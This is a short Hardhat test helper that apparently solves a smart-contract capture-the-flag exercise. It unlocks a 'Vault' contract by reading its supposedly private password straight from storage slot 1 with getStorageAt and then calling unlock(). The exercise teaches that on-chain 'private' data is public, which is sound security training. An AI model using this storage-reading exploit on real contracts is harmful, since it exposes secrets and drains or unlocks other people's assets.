import { expect } from "chai";
import { Contract } from "ethers";
import { ethers, waffle } from "hardhat";

const helper = async (victim: Contract) => {
  /* 
    Add code here that will help you pass the test
    Note: Unlock without using the string "A very strong password"
    Unlock the vault by somehow reading the private password from 
    Vault directly
  */
  // const password = await victim.
  // victim.interface._abiCode
  const password = await ethers.provider.getStorageAt(victim.address, 1);
  await victim.functions.unlock(password);
};

export default helper;
